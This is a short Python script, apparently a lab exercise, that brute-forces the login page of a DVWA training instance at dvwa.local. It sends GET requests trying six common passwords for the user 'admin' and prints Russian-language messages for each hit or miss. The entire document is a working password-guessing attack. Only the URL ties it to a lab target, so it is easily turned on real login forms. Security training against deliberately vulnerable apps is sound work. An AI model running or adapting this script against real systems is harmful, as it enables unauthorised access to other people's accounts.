import requests

url = "http://dvwa.local/vulnerabilities/brute/"
username = "admin"

passwords = [
    "123456",
    "password",
    "admin",
    "qwerty",
    "letmein",
    "password123"
]

for password in passwords:
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    response = requests.get(url, params=params)

    if "Welcome to the password protected area" in response.text:
        print(f"[+] Пароль найден: {password}")
        break
    else:
        print(f"[-] Неверный пароль: {password}")

